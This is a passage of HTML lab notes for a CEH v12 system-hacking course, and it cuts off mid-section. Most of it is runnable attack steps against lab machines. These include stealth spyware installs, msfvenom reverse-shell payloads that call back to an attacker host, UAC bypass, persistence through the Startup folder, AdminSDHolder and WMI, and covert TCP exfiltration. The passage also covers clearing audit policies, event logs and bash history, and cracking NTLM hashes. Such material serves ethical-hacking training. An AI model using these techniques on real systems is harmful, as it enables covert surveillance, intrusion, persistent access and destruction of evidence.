+                    <p><strong>Key procedural steps / narrative:</strong> On Windows Server 2022 sign in CEH\Administrator (Pa$$w0rd), handle network wizard. Open Remote Desktop Connection, Computer 10.10.1.19, Show Options, User name Jason, Connect, password qwerty, Yes. Minimize RDP (close Server Manager if appears). Copy setup.exe from Z:\CEHv12 Module 06 System Hacking\Spyware\General Spyware\Power Spy to target Desktop via RDP. Run setup.exe (Yes on UAC), install default, Finish, Run as Administrator. Setup login password window: New/Confirm password test@123, Submit, OK. Enter login password test@123, Submit. Register product: Later. Power Spy Control Panel: Start monitoring (OK on reboot recommended), Stealth Mode (read hotkey Ctrl+Alt+X), Confirm Yes. Delete setup.exe. Close RDP. Switch to Windows Server 2019, sign in Jason (qwerty), open IE and browse Gmail, sign out. Switch back to Windows Server 2022, RDP again (steps 3-7), close Server Manager. Ctrl+Alt+X to unhide, Run, Yes on UAC, login test@123, Later. Power Spy Control Panel: Stop monitoring. Applications executed (view), Screenshots, Websites Visited, Windows Opened, Clipboard, Event History. Uninstall via Uninstall button (Yes on notices). Close target windows and RDP. Concludes. Close windows and document. End lab and re-launch to reset.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 2: User System Monitoring and Surveillance using Spytech SpyAgent</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Spytech SpyAgent / RDP</span>
+                    <p><strong>What/when:</strong> Powerful spyware monitoring all user activity in stealth mode; website/app/chat blocking, lockdown scheduling, remote log delivery. RDP to Windows Server 2019, install SpyAgent (setup password spytech), config Complete+Stealth, load on startup, password test@123, start monitoring (Ctrl+Shift+Alt+M to unhide), review keystrokes/screenshots/websites/events.</p>
+                    <pre><code># RDP: Computer 10.10.1.19 ; User Jason ; Password qwerty
+
+# SpyAgent setup password: spytech
+# SpyAgent access password: test@123
+# Unhide hotkey: Ctrl+Shift+Alt+M
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows Server 2022 open Remote Desktop Connection, Computer 10.10.1.19, Show Options, User name Jason, Connect, password qwerty, Yes. Close/minimize Server Manager. Copy Spytech SpyAgent folder from Z:\...\Spyware\General Spyware to target Desktop via RDP. Run Setup (password=spytech), Yes on UAC, install default. Select Administrator/Tester, Next. Ready To Install → Next. Include uninstaller? Yes. Close folder location window. Antivirus notice → Next. Finished: Run SpyAgent selected → Close. SpyAgent dialog → Continue. Welcome Step 1 → continue; set password test@123 (New/Confirm), OK, password changed OK. Step 2 → continue. Easy Configuration: Complete + Stealth Configuration; Load on Windows Startup; Next/Next; Apply → Next; Finish → Finish. (Skip SpyAnywhere Cloud Setup.) Step 3 → continue; Getting Started? No. Start Monitoring (bottom-left). Enter access password test@123, OK. Stealth Notice (hotkey Ctrl+Shift+Alt+M), OK. SpyAgent pop-up: check both "do not show" boxes, continue. Remove Spytech SpyAgent folder from Desktop. Close RDP. Switch to Windows Server 2019, sign in Jason (qwerty), open IE, browse Gmail, sign out. Switch to Windows Server 2022, RDP again (steps 1-5), close Server Manager (handle trial pop-up). Ctrl+Shift+Alt+M to unhide; enter password test@123. SpyAgent window: KEYBOARD & MOUSE → View Keystrokes Log (view keystrokes). Screenshots option. Website Usage → View Websites Logged (start/end/active time). Events Timeline. Also Windows Viewed, Program Usage, Files & Documents, Computer Usage. Close windows and RDP. Concludes. Close windows and document. End lab and re-launch to reset.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 3: Hide Files using NTFS Streams</h3>
+                <div class="section-card">
+                    <span class="tool-tag">NTFS Alternate Data Streams</span>
+                    <p><strong>What/when:</strong> NTFS stores files with two data streams (security descriptor + data); alternate data streams (ADS) can hide malicious files. Attacker hides calc.exe inside readme.txt; file size unchanged; symlink executes hidden payload. Target Windows Server 2019.</p>
+                    <pre><code>cd C:\magic
+notepad readme.txt
+# type HELLO WORLD!! ; save
+
+dir
+type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+dir
+# delete calc.exe from C:\magic
+mklink backdoor.exe readme.txt:calc.exe
+backdoor.exe
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows Server 2019 sign in Administrator (Pa$$w0rd). Verify C: is NTFS: This PC → right-click Local Disk (C:) → Properties → File system NTFS → OK. Create C:\magic folder. Copy calc.exe from C:\Windows\System32 to C:\magic. Open cmd, cd C:\magic. notepad readme.txt → Yes to create → type HELLO WORLD!! → File Save → close. dir (note readme.txt size). type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe (hides calc.exe in ADS). dir (readme.txt size unchanged). Delete calc.exe from C:\magic. mklink backdoor.exe readme.txt:calc.exe. backdoor.exe launches calculator. Concludes (real-time attackers hide malicious files and execute remotely). Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 4: Hide Data using White Space Steganography</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Snow (whitespace steganography)</span>
+                    <p><strong>What/when:</strong> Conceal messages in ASCII text by appending spaces/tabs to ends of lines (invisible in viewers). Snow program hides data by appending up to seven spaces interspersed with tabs. Can encrypt with password. Target Windows 11.</p>
+                    <pre><code>cd C:\Users\Admin\Desktop\Snow
+snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+snow -C -p "magic" readme2.txt
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 sign in Admin (Pa$$w0rd). Copy Snow folder from E:\CEH-Tools\...\Whitespace Steganography Tools to Desktop. Create Notepad file, type Hello World!, press Enter, long-press hyphen to draw dashed line; save as readme.txt in Snow folder. Open cmd (search cmd → Open), cd C:\Users\Admin\Desktop\Snow. snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt (magic password; readme2.txt auto-created). Data hidden in readme2.txt. snow -C -p "magic" readme2.txt extracts and shows hidden data (password magic). Open readme2.txt in Notepad, Edit → Select All to see spaces/tabs. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 5: Image Steganography using OpenStego and StegOnline</h3>
+                <div class="section-card">
+                    <span class="tool-tag">OpenStego / StegOnline</span>
+                    <p><strong>What/when:</strong> Hide data in images. OpenStego is Java-based, password-based encryption (DES + MD5). StegOnline is web-based LSB steganography port of StegSolve. Hide/extract text in Island.jpg. Target Windows Server 2019.</p>
+                    <pre><code># OpenStego (GUI)
+# Message File: New Text Document.txt
+# Cover File: Island.jpg
+# Output: Desktop/Stego.bmp
+# Hide Data -> OK
+# Extract Data: Input Stego.bmp -> Output folder Desktop -> Extract Data
+
+# StegOnline
+https://stegonline.georgeom.net/upload
+# Upload Island.jpg -> Embed Files/Data
+# check row 5 columns R,G,B -> Input Data Text "Hello World!!!" -> Go -> Download
+# Extract: upload stego image -> Extract Files/Data -> row5 RGB -> Go -> view Results
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows Server 2019 search openstego → OpenStego. Click ellipsis next to Message File → navigate Z:\...\Image Steganography Tools\OpenStego → select New Text Document.txt (assume contains sensitive info) → Open. Click ellipsis next to Cover File → select Island.jpg → Open. Click ellipsis next to Output Stego File → choose Desktop, name Stego, Open. Click Hide Data → Success OK. Stego.bmp appears on Desktop; double-click to view (image only, no visible text). Close Photos. In OpenStego click Extract Data (left pane). Click ellipsis next to Input Stego File → Desktop → Stego.bmp → Open. Click ellipsis next to Output Folder → Desktop → Open. Click Extract Data → Success OK. Extracted New Text Document.txt on Desktop; double-click shows original text. Close OpenStego. StegOnline: open Firefox → https://stegonline.georgeom.net/upload → UPLOAD IMAGE → select Island.jpg → Open. Image Options → Embed Files/Data. Check checkboxes row 5 columns R,G,B. Input Data field: Text selected, type Hello World!!!, Go. Scroll to Output, Download Extracted Data (Save File if pop-up), save to Desktop. New tab → same URL → UPLOAD IMAGE → select Island.png from Desktop → Open. Image Options → Extract Files/Data. Check row 5 R,G,B → Go. Scroll to Results (download extracted data optional). Concludes. Other tools: QuickStego, SSuite Picsel, CryptaPix, gifshuffle. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit / Startup folder</span>
+                    <p><strong>What/when:</strong> Startup folder contains shortcuts executed at boot/login. Injecting malicious program into startup folder causes it to run when user logs in, maintaining persistence or escalating privileges via misconfigured startup folder. Attacker Parrot; target Windows 11.</p>
+                    <pre><code># Generate
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe
+cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>
+                    <pre><code># In session
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+
+# Startup folder persistence
+cd "C:\\ProgramData\\Start Menu\\Programs\\Startup"
+pwd
+# new terminal:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
+upload /home/attacker/payload.exe
+
+# Handler for reboot
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 8080
+exploit
+getuid
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate exploit.exe payload (lhost 10.10.1.13 lport 444). Copy to share, start Apache. msfconsole handler. Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download exploit.exe, run, click Run. Leave running, switch to Parrot; session opens. getuid. background; bypassuac_fodhelper; set session 1; set LHOST/TARGET; exploit; getsystem -t 1; getuid SYSTEM. cd "C:\ProgramData\Start Menu\Programs\Startup"; pwd. Open new terminal root: msfvenom ... lport 8080 ... > payload.exe. In Meterpreter upload /home/attacker/payload.exe. Windows 11 sign in Admin; restart machine. Parrot open new terminal root: msfconsole handler multi/handler, set payload, lhost, lport 8080, exploit. Windows 11 sign in Admin and restart so payload in startup executes. Switch to Parrot; session opens (takes time). getuid shows admin privileges. Persistence maintained until payload detected. Concludes. Close windows and document. End lab and re-launch to reset.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 7: Maintain Domain Persistence by Exploiting Active Directory Objects</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit / PowerView / AdminSDHolder</span>
+                    <p><strong>What/when:</strong> AdminSDHolder is AD container with default security permissions used as template for protected accounts/groups. Adding a user to AdminSDHolder ACL grants GenericAll (domain admin equivalent). Exploit to add standard user Martin to Domain Admins via AdminSDHolder. Attacker Parrot; target Windows Server 2022 DC.</p>
+                    <pre><code># Generate & serve
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe
+cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>
+                    <pre><code># In session
+getuid
+upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
+shell
+cd C:\Windows\System32
+powershell
+cd C:\Users\Administrator\Downloads\PowerView
+Import-Module ./powerview.psm1
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
+Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
+
+# Add Martin to Domain Admins
+net group "Domain Admins" Martin /add /domain
+
+# Verify access
+dir \\10.10.1.22\C$
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate Exploit.exe. Copy to share, start Apache. msfconsole handler. Windows Server 2022 sign in CEH\Administrator (Pa$$w0rd), browse http://10.10.1.13/share, download Exploit.exe, run, click Run. Switch to Parrot; session opens. getuid shows admin. upload -r PowerTools-master to C:\Users\Administrator\Downloads. shell; cd C:\Windows\System32; powershell. cd PowerView; Import-Module ./powerview.psm1. Add-ObjectAcl adds Martin to AdminSDHolder ACL with All rights. Get-ObjectAcl verifies Martin has GenericAll. REG ADD sets AdminSDProtectFrequency to 300 (3 min) instead of 60 min (Microsoft doesn't recommend; performance issues). On Windows Server 2022 open Server Manager → Tools → Active Directory Users and Computers → View → Advanced Features. Expand CEH.com and System → right-click AdminSDHolder → Properties → Security tab → Martin with full access (after ~3 min). Parrot Meterpreter: net group "Domain Admins" Martin /add /domain. Windows Server 2022 AD Users and Computers → Users → Martin J properties → Member Of shows Domain Admins. Sign out Administrator, sign in Other user CEH\Martin / apple. Open PowerShell, dir \\10.10.1.22\C$ → accessible, domain persistence established. PowerView additional commands table for extracting users/groups/domains. Concludes. Close windows and document. Restart Server 2022 and Parrot.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 8: Privilege Escalation and Maintain Persistence using WMI</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit / WMI-Persistence</span>
+                    <p><strong>What/when:</strong> WMI event subscription can install event filters/providers/bindings that execute code when defined event occurs (admin task automation). Exploit WMI event subscription for persistent access. Generate two payloads (Payload.exe, wmi.exe), catch session on Windows Server 2019, upload WMI-Persistence, install persistence trigger on startup, restart to reopen session.</p>
+                    <pre><code># Generate payloads
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/wmi.exe
+cp /home/attacker/Desktop/Payload.exe /var/www/html/share/
+cp /home/attacker/Desktop/wmi.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>
+                    <pre><code># In session
+getuid
+upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
+load powershell
+powershell_shell
+Import-Module ./WMI-Persistence.ps1
+# if error: Import-Module "C:\Users\Administrator\Downloads\WMI-Persistence.ps1"
+Install-Persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe"
+
+# Exit PS
+# Ctrl+C then y
+
+# Second handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+# after reboot: getuid
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate Payload.exe and wmi.exe. Copy both to share, start Apache. msfconsole handler. Windows Server 2019 sign in Administrator (Pa$$w0rd), browse http://10.10.1.13/share, download Payload.exe and wmi.exe (Save File), saved in Downloads. Run Payload.exe, click Run. Switch to Parrot; session opens. getuid. upload Wmi-Persistence-master to C:\Users\Administrator\Downloads. load powershell; powershell_shell. Import-Module ./WMI-Persistence.ps1 (or full path). Install-Persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe" (takes ~5 min). Ctrl+C then y to exit PS. Open new terminal root: msfconsole handler multi/handler, set payload/lhost/lport, exploit. Windows Server 2019 restart (handle Other Unplanned pop-up). Previous session closes. After ~5 min new session opens in second terminal. getuid shows SYSTEM; persistence on restart. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 9: Covert Channels using Covert_TCP</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Covert_TCP / tcpdump / Wireshark</span>
+                    <p><strong>What/when:</strong> Covert_TCP manipulates TCP/IP header to send a file one byte at a time inside unused/misused header fields, bypassing firewalls/IDS/IPS/proxies. Acts as server/client. Attacker Parrot (10.10.1.13) sends message.txt to Ubuntu (10.10.1.9); tcpdump captures nothing.</p>
+                    <pre><code># Parrot (sender)
+cd Desktop
+mkdir Send
+cd Send
+echo "Secret Message" > message.txt
+# copy covert_tcp.c from CEH-Tools share into Send
+cc -o covert_tcp covert_tcp.c
+
+# Receiver (Ubuntu)
+sudo su
+tcpdump -nvvx port 8888 -i lo
+# new tab:
+cd Desktop
+mkdir Receive
+cd Receive
+# copy covert_tcp.c, then:
+cc -o covert_tcp covert_tcp.c
+sudo su
+./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
+
+# Send (Parrot)
+sudo su
+./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+
+# Wireshark filter
+tcp
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot: open Terminal, cd Desktop, mkdir Send, cd Send, echo "Secret Message" > message.txt. Copy covert_tcp.c from CEH-Tools (CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP) via Places → ceh-tools 10.10.1.11 (or SMB smb://10.10.1.11, Admin/Pa$$w0rd) to Send folder. cc -o covert_tcp covert_tcp.c compiles. Switch to Ubuntu, sign in Ubuntu/toor. Open Terminal, sudo su (toor). tcpdump -nvvx port 8888 -i lo (listener). New tab: cd Desktop; mkdir Receive; cd Receive. Copy covert_tcp.c from Windows share via Files → Other Locations → smb://10.10.1.11 (Admin/Pa$$w0rd) → CEH-Tools → Covert_TCP to Receive. cc -o covert_tcp covert_tcp.c. sudo su. ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt starts receiver. Parrot: sudo su (toor), ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file .../message.txt sends one char at a time. Ubuntu terminal shows message received. Stop tcpdump (Ctrl+C); no packets captured. Open Wireshark on Parrot, capture eth0, filter tcp; inspect packets showing chars in headers. Open receive.txt in Ubuntu → full message. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 4 - Clear Logs: Task 1: View, Enable, and Clear Audit Policies using Auditpol</h3>
+                <div class="section-card">
+                    <span class="tool-tag">auditpol.exe</span>
+                    <p><strong>What/when:</strong> Auditpol.exe changes audit security settings at category/subcategory levels. Intruders disable auditing after gaining admin privileges, then re-enable. View, enable, clear audit policies on Windows 11.</p>
+                    <pre><code>auditpol /get /category:*
+auditpol /set /category:"system","account logon" /success:enable /failure:enable
+auditpol /get /category:*
+auditpol /clear /y
+auditpol /get /category:*
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 search cmd → Run as administrator, Yes on UAC. auditpol /get /category:* views all audit policies. auditpol /set /category:"system","account logon" /success:enable /failure:enable enables. auditpol /get /category:* verifies enabled. auditpol /clear /y clears. auditpol /get /category:* verifies "No Auditing" (system not logging). Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 4 - Clear Logs: Task 2: Clear Windows Machine Logs using Various Utilities</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Clear_Event_Viewer_Logs.bat / wevtutil / Cipher</span>
+                    <p><strong>What/when:</strong> Clear system logs using Clear_Event_Viewer_Logs.bat, wevtutil, and Cipher. wevtutil enumerates/clears event logs; Cipher overwrites deleted files to prevent recovery (0x00, 0xFF, random).</p>
+                    <pre><code># Run as admin
+# E:\CEH-Tools\...\Clear_Event_Viewer_Logs.bat (Run as administrator)
+
+# Elevated cmd:
+wevtutil el
+wevtutil cl system
+# also: wevtutil cl application ; wevtutil cl security
+
+cipher /w:C:
+# Ctrl+C to stop
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 navigate to E:\CEH-Tools\...\Clear_Event_Viewer_Logs.bat, right-click → Run as administrator, Yes on UAC. Command prompt clears security/system/application logs and auto-closes. Search cmd → Run as administrator, Yes. wevtutil el lists event log names. wevtutil cl system clears system log (cl/clear-log; log_name system/application/security). cipher /w:C: overwrites deleted files on C: drive (first 0x00, then 0xFF, then random); press Ctrl+C to stop (time depends on size). Concludes (Clear_Event_Viewer_Logs.bat can also run via cmd/PowerShell). Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 4 - Clear Logs: Task 3: Clear Linux Machine Logs using the BASH Shell</h3>
+                <div class="section-card">
+                    <span class="tool-tag">BASH history / shred</span>
+                    <p><strong>What/when:</strong> BASH stores command history in ~/.bash_history; investigators can track commands. Disable/clear/shred history on Parrot.</p>
+                    <pre><code>export HISTSIZE=0
+history -c
+history -w
+shred ~/.bash_history
+more ~/.bash_history
+# Ctrl+Z
+shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Parrot open Terminal. export HISTSIZE=0 disables saving history (HISTSIZE number of commands saved → 0). history -c clears stored history. history -w deletes current shell history only. shred ~/.bash_history makes content unreadable. more ~/.bash_history views shredded content. Ctrl+Z stops viewing. Combined: shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit (shreds, empties, clears, exits). Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 4 - Clear Logs: Task 4: Hiding Artifacts in Windows and Linux Machines</h3>
+                <div class="section-card">
+                    <span class="tool-tag">attrib / net user / Linux dotfiles</span>
+                    <p><strong>What/when:</strong> Artifacts hold important info about user activities; OS hides some artifacts. Hide folders, user accounts, files on Windows/Linux.</p>
+                    <pre><code># Windows (elevated cmd)
+cd C:\Users\Admin\Desktop
+mkdir Test
+dir
+attrib +h +s +r Test
+dir
+attrib -s -h -r Test
+dir
+net user Test /add
+net user Test /active:yes
+net user Test /active:no
+
+# Linux (Parrot)
+cd Desktop
+mkdir Test
+cd Test
+>> Sample.txt
+touch Sample.txt
+touch .Secret.txt
+ls
+ls -al
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 search cmd → Run as administrator, Yes on UAC. cd C:\Users\Admin\Desktop. mkdir Test. dir (count dirs). attrib +h +s +r Test hides (hidden+system+readonly). dir confirms Test hidden (fewer dirs). attrib -s -h -r Test unhides. dir confirms restored. net user Test /add creates user. net user Test /active:yes activates. Windows icon → user Admin shows users list includes Test. net user Test /active:no hides account (removed from list). Switch to Parrot. Open Terminal, cd Desktop, mkdir Test, cd Test. >> Sample.txt and touch Sample.txt create file. touch .Secret.txt creates hidden file (dot prefix). ls shows only Sample.txt. ls -al shows .Secret.txt. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 4 - Clear Logs: Task 5: Clear Windows Machine Logs using CCleaner</h3>
+                <div class="section-card">
+                    <span class="tool-tag">CCleaner</span>
+                    <p><strong>What/when:</strong> System optimization, privacy, and cleaning tool; removes unused files and traces of internet browsing. Clear system logs/tracks. Other tools: DBAN, Privacy Eraser, Wipe, BleachBit.</p>
+                    <pre><code># Installer
+E:\CEH-Tools\...\CCleaner\ccsetup591_pro_trial.exe
+# Install -> Run CCleaner -> Start My Trial
+# Health Check -> Start -> Make it better
+# Custom Clean / Registry / Tools available
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 navigate to E:\CEH-Tools\...\Covering Tracks Tools\CCleaner; double-click ccsetup591_pro_trial.exe, Yes on UAC. Setup loads; CCleaner Professional Setup wizard → Install. Completed wizard: deselect View release notes, click Run CCleaner. Welcome to Free trial wizard → Start My Trial. CCleaner Professional window appears. Health Check (left pane) → Start → scan → Make it better → "Patching up your PC…" → "Your PC now feels like a superstar." Custom Clean can analyze system files (Windows/Applications tabs select/deselect). Registry scans issues. Tools: uninstall apps, software updates, browser plugins. Concludes. Close windows and document. End lab.</p>
+                </div>
+            </section>
+
+        </div>
+
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Module 06 (Extended)</span>
+                <h2 class="hero-3d">Detailed Lab Narratives and Expected Outputs</h2>
+            </div>
+
+            <section class="lab-task">
+                <h3>Task 1 (Part 1): Responder - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Sign in Parrot Security with password toor, then switch to Windows 11 and sign in as Jason with password qwerty; handle the Choose privacy settings wizard by clicking Next/Next/Accept if it appears. Click Parrot Security, open MATE Terminal. Run sudo responder -I eth0, enter toor at the sudo prompt (password not visible). Responder starts listening on eth0 (verify interface with ifconfig; interface may differ). Click Windows 11, right-click Start, click Run, type \\CEH-Tools, click OK. Leave Windows 11 running and switch back to Parrot. Responder captures access logs and collects the NTLM hash of the logged-in user Jason; logs stored in /usr/share/responder/logs by default. Select and copy Jason's hash value. Open a terminal, run sudo su (password toor), then pluma hash.txt, paste the hash, save and close. Run john hash.txt; John the Ripper cracks and displays the plaintext password. Concludes demonstration. Close all open windows and document acquired information. Switch to Windows 11, click Start, user icon, Sign out (close Network Error window if shown).</p>
+                    <p><strong>Expected output:</strong> Responder shows captured NTLM hash; John prints recovered password in plaintext.</p>
+                    <p><strong>Notes:</strong> Responder only responds to File Server Service requests (SMB) by default. Password typed at sudo prompt is not visible.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 2 (Part 1): L0phtCrack - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 press Ctrl+Alt+Delete, select Admin, password Pa$$w0rd, Enter (alternatively use Pa$$w0rd button under thumbnail or Type Text | Type Password; handle Welcome/Networks wizards). Search l0phtcrack, open L0phtCrack 7. Click Password Auditing Wizard. Choose Target System Type: Windows → Next. Windows Import: A remote machine → Next. Windows Import From Remote Machine (SMB): Host 10.10.1.22, Use Specific User Credentials, Username Administrator, Password Pa$$w0rd, Domain CEH.com if applicable → Next. Choose Audit Type: Thorough Password Audit → Next. Reporting Options: Generate Report at End of Auditing, CSV report type, Browse to Desktop → Save → Next. Job Scheduling: Run this job immediately → Next. Summary → Finish. L0phtCrack cracks remote passwords; status in lower-right corner. After completion shows cracked passwords; click Stop. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> Cracked user passwords from remote machine displayed; CSV report saved on Desktop.</p>
+                    <p><strong>Notes:</strong> Cracking all passwords takes time. Passwords cracked quickly are weak; strengthen password policy.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 3 (Part 1): Exploit Sites - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 open Firefox. Browse https://www.exploit-db.com/. View latest vulnerabilities or search. Left pane → SEARCH EDB advanced search. Type: remote; Platform: Windows_x86-64; click Search. Scroll results; click vulnerability (e.g., CloudMe Sync 1.11.2 Buffer Overflow - WoW64 DEP Bypass). View details: CVE ID, author, type, platform, published date. Click download icon in Exploit section. Navigate to Downloads, right-click saved file → Show more options → Edit with Notepad++ (click No on update pop-up). Exploit code displayed; can be used to exploit target. Close windows. Similarly use VulDB (https://vuldb.com), MITRE CVE (https://cve.mitre.org), Vulners (https://vulners.com), CIRCL CVE Search (https://cve.circl.lu).</p>
+                    <p><strong>Expected output:</strong> List of vulnerabilities and downloadable exploit code.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 4 (Part 1): Client-Side VNC - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Sign in Parrot (attacker/toor), ignoring updater pop-ups. Open Terminal, sudo su (toor). Generate Test.exe payload. Create share dir, set permissions, copy payload, start Apache. Launch msfconsole, use multi/handler, set payload/LHOST/LPORT, exploit. Switch to Windows 11, open Firefox, browse http://10.10.1.13/share, download Test.exe, run, click Run. Leave Windows 11 running, switch to Parrot. Session opens; if not auto-connected use sessions -i 1. sysinfo verifies target. Upload PowerUp.ps1 to target pwd. shell → powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks" (ensure space after dot). Exit back to Meterpreter. run vnc opens VNC session showing victim activity. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> Meterpreter session and VNC window showing target desktop.</p>
+                    <p><strong>Notes:</strong> Payload can be delivered via email attachment or physical media. PowerUp checks misconfigured services, unquoted paths, registry autoruns.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 5 (Part 1): Armitage - Detailed Narrative</h3>
+                <div class="section-card">
